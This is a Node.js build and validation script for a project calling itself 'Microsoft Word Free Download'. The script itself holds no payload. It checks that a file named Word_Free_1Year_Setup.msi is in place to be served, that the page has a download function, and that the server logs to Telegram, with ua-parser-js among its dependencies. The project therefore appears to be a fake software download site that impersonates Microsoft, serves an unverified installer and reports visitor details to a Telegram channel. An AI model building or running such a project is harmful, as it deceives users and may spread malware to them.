#!/usr/bin/env node

/**
 * Microsoft Word Free Download - Full Stack Build System
 * Comprehensive build script for development and production
 */

const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

// ANSI colors for console output
const colors = {
    reset: '\x1b[0m',
    bright: '\x1b[1m',
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m'
};

class BuildSystem {
    constructor() {
        this.startTime = Date.now();
        this.errors = [];
        this.warnings = [];
    }

    log(message, color = 'reset') {
        console.log(`${colors[color]}${message}${colors.reset}`);
    }

    success(message) {
        this.log(`✅ ${message}`, 'green');
    }

    error(message) {
        this.log(`❌ ${message}`, 'red');
        this.errors.push(message);
    }

    warning(message) {
        this.log(`⚠️  ${message}`, 'yellow');
        this.warnings.push(message);
    }

    info(message) {
        this.log(`ℹ️  ${message}`, 'blue');
    }

    // Check if file/directory exists
    exists(filePath) {
        return fs.existsSync(filePath);
    }

    // Ensure directory exists
    ensureDir(dir) {
        if (!this.exists(dir)) {
            fs.mkdirSync(dir, { recursive: true });
            this.success(`Created directory: ${dir}`);
        }
    }

    // Copy file with error handling
    copyFile(src, dest) {
        try {
            if (this.exists(src)) {
                this.ensureDir(path.dirname(dest));
                fs.copyFileSync(src, dest);
                this.success(`Copied: ${src} → ${dest}`);
            } else {
                this.warning(`Source file not found: ${src}`);
            }
        } catch (error) {
            this.error(`Failed to copy ${src}: ${error.message}`);
        }
    }

    // Validate project structure
    validateStructure() {
        this.log('\n🔍 Validating Project Structure...', 'cyan');
        
        const requiredFiles = [
            'server.js',
            'package.json',
            'client/index.html',
            'client/public/Word_Free_1Year_Setup.msi',
            '.env.example'
        ];

        const requiredDirs = [
            'client',
            'client/css',
            'client/js',
            'client/images',
            'client/fonts',
            'client/public'
        ];

        // Check required directories
        requiredDirs.forEach(dir => {
            if (this.exists(dir)) {
                this.success(`Directory exists: ${dir}`);
            } else {
                this.ensureDir(dir);
            }
        });

        // Check required files
        requiredFiles.forEach(file => {
            if (this.exists(file)) {
                this.success(`File exists: ${file}`);
            } else {
                this.error(`Missing required file: ${file}`);
            }
        });
    }

    // Optimize CSS files
    optimizeCSS() {
        this.log('\n🎨 Optimizing CSS...', 'cyan');
        
        const cssDir = 'client/css';
        if (this.exists(cssDir)) {
            const cssFiles = fs.readdirSync(cssDir).filter(file => file.endsWith('.css'));
            this.info(`Found ${cssFiles.length} CSS files`);
            
            // Add enhanced styling if not exists
            if (!this.exists('client/css/enhanced-styling.css')) {
                this.warning('Enhanced styling file not found');
            } else {
                this.success('Enhanced styling file present');
            }
        }
    }

    // Validate JavaScript files
    validateJS() {
        this.log('\n🔧 Validating JavaScript...', 'cyan');
        
        const jsDir = 'client/js';
        if (this.exists(jsDir)) {
            const jsFiles = fs.readdirSync(jsDir).filter(file => file.endsWith('.js'));
            this.info(`Found ${jsFiles.length} JavaScript files`);
        }

        // Check if index.html has the download functionality
        if (this.exists('client/index.html')) {
            const content = fs.readFileSync('client/index.html', 'utf8');
            if (content.includes('downloadFreeVersion')) {
                this.success('Download functionality present in HTML');
            } else {
                this.error('Download functionality missing from HTML');
            }
        }
    }

    // Check dependencies
    checkDependencies() {
        this.log('\n📦 Checking Dependencies...', 'cyan');
        
        try {
            const packageJson = JSON.parse(fs.readFileSync('package.json', 'utf8'));
            const deps = Object.keys(packageJson.dependencies || {});
            const devDeps = Object.keys(packageJson.devDependencies || {});
            
            this.info(`Production dependencies: ${deps.length}`);
            this.info(`Development dependencies: ${devDeps.length}`);
            
            const requiredDeps = ['express', 'cors', 'axios', 'ua-parser-js', 'dotenv'];
            const missingDeps = requiredDeps.filter(dep => !deps.includes(dep));
            
            if (missingDeps.length === 0) {
                this.success('All required dependencies present');
            } else {
                this.error(`Missing dependencies: ${missingDeps.join(', ')}`);
            }
        } catch (error) {
            this.error(`Failed to read package.json: ${error.message}`);
        }
    }

    // Environment setup
    setupEnvironment() {
        this.log('\n🌍 Environment Setup...', 'cyan');
        
        if (this.exists('.env.example')) {
            this.success('.env.example found');
            if (!this.exists('.env')) {
                this.warning('.env file not found - copy from .env.example');
                this.info('Run: cp .env.example .env');
            } else {
                this.success('.env file present');
            }
        } else {
            this.error('.env.example missing');
        }
    }

    // Asset optimization
    optimizeAssets() {
        this.log('\n🖼️  Optimizing Assets...', 'cyan');
        
        const assetDirs = ['client/images', 'client/fonts', 'client/public'];
        
        assetDirs.forEach(dir => {
            if (this.exists(dir)) {
                const files = fs.readdirSync(dir);
                this.info(`${dir}: ${files.length} files`);
            }
        });

        // Check MSI file
        if (this.exists('client/public/Word_Free_1Year_Setup.msi')) {
            const stats = fs.statSync('client/public/Word_Free_1Year_Setup.msi');
            this.success(`MSI file ready: ${(stats.size / 1024).toFixed(2)} KB`);
        } else {
            this.error('MSI file missing from client/public/');
        }
    }

    // Development server check
    checkDevServer() {
        this.log('\n🚀 Development Server Check...', 'cyan');
        
        if (this.exists('server.js')) {
            const content = fs.readFileSync('server.js', 'utf8');
            
            if (content.includes('0.0.0.0:5000')) {
                this.success('Server configured for Replit (0.0.0.0:5000)');
            } else {
                this.warning('Server might not be configured for Replit');
            }

            if (content.includes('sendTelegramLog')) {
                this.success('Telegram logging functionality present');
            } else {
                this.warning('Telegram logging not found');
            }

            if (content.includes('client/public')) {
                this.success('MSI file path configured correctly');
            } else {
                this.error('MSI file path not updated in server.js');
            }
        }
    }

    // Production build
    buildProduction() {
        this.log('\n🏗️  Production Build...', 'cyan');
        
        // Create dist directory
        this.ensureDir('dist');
        
        // Copy essential files
        const filesToCopy = [
            { src: 'server.js', dest: 'dist/server.js' },
            { src: 'package.json', dest: 'dist/package.json' },
            { src: '.env.example', dest: 'dist/.env.example' }
        ];

        filesToCopy.forEach(({ src, dest }) => {
            this.copyFile(src, dest);
        });

        // Copy client directory
        if (this.exists('client')) {
            this.ensureDir('dist/client');
            try {
                execSync('cp -r client/* dist/client/', { stdio: 'inherit' });
                this.success('Client files copied to dist/');
            } catch (error) {
                this.error(`Failed to copy client files: ${error.message}`);
            }
        }
    }

    // Generate build report
    generateReport() {
        const buildTime = Date.now() - this.startTime;
        
        this.log('\n📊 Build Report', 'magenta');
        this.log('═'.repeat(50), 'magenta');
        this.log(`Build Time: ${buildTime}ms`, 'cyan');
        this.log(`Errors: ${this.errors.length}`, this.errors.length > 0 ? 'red' : 'green');
        this.log(`Warnings: ${this.warnings.length}`, this.warnings.length > 0 ? 'yellow' : 'green');
        
        if (this.errors.length > 0) {
            this.log('\nErrors:', 'red');
            this.errors.forEach(error => this.log(`  • ${error}`, 'red'));
        }
        
        if (this.warnings.length > 0) {
            this.log('\nWarnings:', 'yellow');
            this.warnings.forEach(warning => this.log(`  • ${warning}`, 'yellow'));
        }
        
        this.log('\n' + '═'.repeat(50), 'magenta');
        
        if (this.errors.length === 0) {
            this.success('Build completed successfully! 🎉');
        } else {
            this.error('Build completed with errors!');
            process.exit(1);
        }
    }

    // Main build process
    async build() {
        this.log('🚀 Microsoft Word Free Download - Full Stack Build', 'bright');
        this.log('═'.repeat(60), 'cyan');
        
        this.validateStructure();
        this.checkDependencies();
        this.setupEnvironment();
        this.optimizeCSS();
        this.validateJS();
        this.optimizeAssets();
        this.checkDevServer();
        
        const args = process.argv.slice(2);
        if (args.includes('--production') || args.includes('-p')) {
            this.buildProduction();
        }
        
        this.generateReport();
    }
}

// Run build system
if (require.main === module) {
    const buildSystem = new BuildSystem();
    buildSystem.build().catch(error => {
        console.error('❌ Build failed:', error);
        process.exit(1);
    });
}

module.exports = BuildSystem;